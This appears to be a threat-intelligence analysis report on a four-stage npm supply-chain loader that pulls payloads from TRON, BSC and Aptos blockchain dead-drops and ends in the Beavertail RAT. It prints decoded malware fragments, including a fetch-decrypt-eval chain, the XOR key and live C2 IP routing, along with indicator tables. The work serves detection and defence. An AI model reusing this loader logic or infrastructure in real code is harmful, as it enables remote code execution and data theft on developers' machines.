# AX-Live: Live Stage 2 Pull — Campaign A9-7298

**Date**: 2026-07-05  
**Method**: TRON W5 dead-drop → BSC TX → XOR decrypt  
**Stage 2 length**: 5,849 bytes  
**Stage 3 length**: 3,072 bytes (NVu-embedded in Stage 2)

---

## Pull Chain

```
TRON W5:  TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP
  TX raw_data.data (hex): 64393965...31 (Jun 23 2026 02:35:45 UTC)
  Decode: hex → UTF8 → reverse
  → BSC TX hash: 0x18a8420f727f2405f9d1805ad887b31029b584b2ff5a7ec0f57c72635183e99d

BSC (bsc-dataseed.binance.org):
  eth_getTransactionByHash(0x18a8420f...)
  input.substring(2) → hex → UTF8 → split("?.?")[1]
  → XOR payload (5,849 chars)

XOR decrypt (key = "2[gWfGj;<:-93Z^C", 16-char repeating):
  → Stage 2 JavaScript (5,849 bytes)
```

W6 also active:
```
TRON W6:  TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG
  TX timestamp: Jun 20 2026 13:37:48 UTC
  → BSC TX hash: 0x7ffb4efddd96e20aec90724be2ac9a71c138a9af697b9fb8224bbf80ea4f22be
```

---

## Stage 2 Architecture

### Entry + rate-limit
```javascript
if (global["_t_t"]) return;
global["_t_t"] = new global.Date().getTime();
global["___dirname"] = __dirname;
global["___filename"] = __filename;
```
Rate-limit global: `_t_t` (distinct from Stage 1's `_p_t`).

### Persistence blob
```javascript
global["_t_c"] = c.toString();  // Stage 2 source stored for persistence
global["_t_0"] = atob("dmFyIF8k...");  // JS code string: sets _t_1/_t_2 to W5 wallet pair
```

The `atob` payload decodes to (cipher `_$_96c7`, constants 80/31099/210/45223/6108610, seed 5914652):
```javascript
global['_t_1'] = 'TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP'  // W5 TRON (initial fallback)
global['_t_2'] = '0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e'  // W5 Aptos
```
These are then **overwritten** by the routing IIFE below.

### C2 routing (cipher `_$_9f51`, constants 102/20113/92/48803/4969312, seed 3654926)

Full routing table:

| `_V` condition | `_t_s` (beacon) | `_t_u` (upload) |
|---------------|-----------------|-----------------|
| `_V[0] == 'A'` OR `_V == '0'` | `http://166.88.134.62:443` | `http://166.88.134.62` |
| `!isNaN(parseInt(_V))` (numeric) | `http://198.105.127.210:443` | `http://198.105.127.210` |
| else | `http://23.27.202.27:443` | `http://23.27.202.27:27017` |

For campaign `_V = 'A9-7298'`: `_V[0] == 'A'` → routes to **166.88.134.62**.

**Routing change vs prior docs**: Previously, `166.88.134.62` was documented as admin-only (triggered by `_V == 'admin'`). This Stage 2 variant routes ALL series-A campaigns there. Series-9 victims are now being handled by the admin server.

Always set after routing:
```javascript
global['_t_1'] = 'TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v'  // W3 — Stage 3 TRON dead-drop
global['_t_2'] = '0x533b2dbcaeff19cd1f799234a27b578d713d8fcaa341b7501e4526106483e0b1'  // Stage 3 Aptos/BSC
```

### Stage 3 decode (NVu cipher embedded in `c()`)

The async function `c()` uses `NVu` (shuffle cipher, constants 122/16975/89/35503/7635721, seed 6964224) to decode:

1. `cWL` (890 chars) → token decompressor function body
2. `FhD_encoded` (2,072 chars) → NVu-decoded → token-decompressed → Stage 3 JS (3,072 bytes)

`Function('constructor')` exploit: `NVu["wanfojclgdrhucpkcmrsvbtuzsotnytoqxeri"].substr(0,11)` = `"constructor"` → `NVu['constructor']` = `Function`.

---

## Stage 3 Analysis

Stage 3 is a 3,072-byte TRON→BSC→XOR fetcher, identical in structure to Stage 1.

**Cipher**: `_$_56c8`, constants 388/26425/130/28026/4862352, seed 3380292.

**Complete `_$_56c8` string table**:

| Index | Value | Role |
|-------|-------|------|
| 0 | `r` | require global key |
| 1 | `end` | stream event |
| 2 | `error` | stream/spawn event |
| 3 | `on` | EventEmitter method |
| 4 | `` | empty string |
| 5 | `data` | response field / event |
| 6 | `parse` | JSON.parse |
| 7 | `JSON` | global |
| 8 | `get` | https.get |
| 9 | `https` | module |
| 10 | `Promise` | global |
| 11 | `2.0` | JSON-RPC version |
| 12 | `stringify` | JSON.stringify |
| 13 | `POST` | HTTP method |
| 14 | `request` | https.request |
| 15 | `write` | req.write |
| 16 | `join` | Array.join |
| 17 | `reverse` | Array.reverse |
| 18 | `split` | String.split |
| 19 | `utf8` | encoding |
| 20 | `toString` | Buffer.toString |
| 21 | `raw_data` | TRON TX field |
| 22 | `https://api.trongrid.io/v1/accounts/` | TRON API base |
| 23 | `/transactions?only_confirmed=true&only_from=true&limit=1` | TRON API suffix |
| 24 | `hex` | encoding |
| 25 | `from` | Buffer.from |
| 26 | `Buffer` | global |
| 27 | `arguments` | Aptos TX field |
| 28 | `payload` | Aptos TX field |
| 29 | `https://fullnode.mainnet.aptoslabs.com/v1/accounts/` | Aptos API base |
| 30 | `/transactions?limit=1` | Aptos API suffix |
| 31 | `?.?` | BSC TX separator |
| 32 | `substring` | skip 0x |
| 33 | `input` | BSC TX field |
| 34 | `result` | JSON-RPC result |
| 35 | `eth_getTransactionByHash` | BSC method |
| 36 | `bsc-dataseed.binance.org` | BSC RPC primary |
| 37 | `bsc-rpc.publicnode.com` | BSC RPC fallback |
| 38 | `length` | |
| 39 | `call` | |
| 40 | `charCodeAt` | |
| 41 | `fromCharCode` | |
| 42 | `String` | global |
| 43 | `2[gWfGj;<:-93Z^C` | **XOR key** — same as Stage 1 W5 |
| 44 | `_t_1` | → `TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v` (W3 TRON) |
| 45 | `_t_2` | → `0x533b2dbcaeff19cd1f799234a27b578d713d8fcaa341b7501e4526106483e0b1` |

**Stage 3 execution**:
```javascript
var n = await t("2[gWfGj;<:-93Z^C", global['_t_1'], global['_t_2']);
eval(n);  // Stage 4 (Beavertail RAT)
```
= TRON W3 `TA48dct6...` → BSC → XOR decrypt → eval Stage 4.

**XOR key reuse**: Stage 3 uses the same key `"2[gWfGj;<:-93Z^C"` that Stage 1 used for W5 delivery. Same key across two stages of the chain for series-9/A campaigns.

---

## Full 4-Stage Chain

```
[INFECTED PACKAGE]
  astro.config.mjs / npm postinstall script
  └─ Stage 1 (obfuscator.io outer wrapper)
       Cipher: _$_1e42 seed 2857687 / _$af163278 seed 1812138
       TRON W5: TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP
       Aptos W5: 0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e
       BSC: bsc-dataseed.binance.org
       XOR key: "2[gWfGj;<:-93Z^C"
       └─ Stage 2 (5,849 bytes)
            Rate-limit: _t_t / Persistence: _t_c, _t_0
            C2 routing: _V[0]=='A' → 166.88.134.62:443
            Sets _t_1 = W3 / _t_2 = 0x533b...
            └─ Stage 3 (3,072 bytes, NVu-embedded)
                 Cipher: _$_56c8 seed 3380292
                 TRON W3: TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v
                 Aptos: 0x533b2dbcaeff19cd1f799234a27b578d713d8fcaa341b7501e4526106483e0b1
                 BSC: bsc-dataseed.binance.org
                 XOR key: "2[gWfGj;<:-93Z^C" (SAME KEY)
                 └─ Stage 4: Beavertail RAT (eval'd)
                      C2 beacon: http://166.88.134.62:443 (series-A)
```

---

## New IOCs

| Type | Value | Note |
|------|-------|------|
| BSC TX | `0x18a8420f727f2405f9d1805ad887b31029b584b2ff5a7ec0f57c72635183e99d` | W5 live dead-drop (Jun 23 2026) |
| BSC TX | `0x7ffb4efddd96e20aec90724be2ac9a71c138a9af697b9fb8224bbf80ea4f22be` | W6 live dead-drop (Jun 20 2026) |
| BSC TX | `0x533b2dbcaeff19cd1f799234a27b578d713d8fcaa341b7501e4526106483e0b1` | W3 Stage 3→4 link |
| Global key | `_t_t` | Stage 2 rate-limit timestamp |
| Global key | `_t_c` | Stage 2 source string (persistence) |
| Global key | `_t_0` | Stage 2 atob persistence blob |
| Global key | `_t_s` | C2 server URL |
| Global key | `_t_u` | C2 upload URL |
| Global key | `_t_1` | Stage 3 TRON wallet key |
| Global key | `_t_2` | Stage 3 Aptos/BSC key |

## Known IOCs Confirmed Active

| IOC | Confirmed |
|-----|-----------|
| C2 `166.88.134.62:443` | Live — routes series-A (previously admin-only) |
| C2 `198.105.127.210:443` | Live — routes numeric IDs |
| C2 `23.27.202.27:27017` | In routing table (status: dead per ANALYSIS_C2_LIVENESS_U.md) |
| W3 `TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v` | Active Stage 3 dead-drop (Jun 2026) |
| W5/W6 TRON wallets | Both live with TXs (Jun 20–23 2026) |

---

## Routing Change — Action Required

The `166.88.134.62` server was previously documented as admin/test only. This Stage 2 routes all `_V[0] == 'A'` victims (series 9 = `A9-XXXX`) there. This is either:
1. A new victim series being onboarded to the admin server for monitoring
2. A routing change that reclassifies series-A as production on that host

Update `OVERVIEW_C2_INFRASTRUCTURE.md` routing table accordingly.

---

## Related Documents

- `ANALYSIS_AX_OBFUSCATOR.md` — Stage 1 decode (source of this live pull)
- `ANALYSIS_BEAVERTAIL_T.md` — Stage 4 Beavertail RAT analysis
- `OVERVIEW_C2_INFRASTRUCTURE.md` — C2 routing reference (needs update)
- `ANALYSIS_AM_CASHOUT_WALLETS.md` — W3 wallet history
- `ANALYSIS_C2_LIVENESS_U.md` — C2 IP liveness data
